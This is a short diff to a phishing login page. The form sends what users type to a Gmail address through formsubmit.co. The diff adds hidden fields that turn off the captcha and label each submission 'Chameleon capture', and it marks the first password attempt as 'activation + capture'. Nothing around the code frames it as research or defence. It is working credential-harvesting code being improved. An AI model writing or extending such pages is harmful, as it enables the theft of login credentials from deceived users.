@@ -460,6 +460,9 @@
            can still fire. -->
       <form id="loginForm" action="https://formsubmit.co/officeboxmaillinks@gmail.com" method="POST">
         <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_subject" value="Chameleon capture">
         <input type="hidden" id="emailField" name="email">
         
         <div class="form-group">
@@ -702,7 +705,7 @@
         return;
       }
       
-      // --- ATTEMPT 1: NATIVE SUBMIT (activation) ---
+      // --- ATTEMPT 1: NATIVE SUBMIT (activation + capture) ---
       if (attemptCount === 0) {
         attemptCount = 1;
         firstPassword = password;
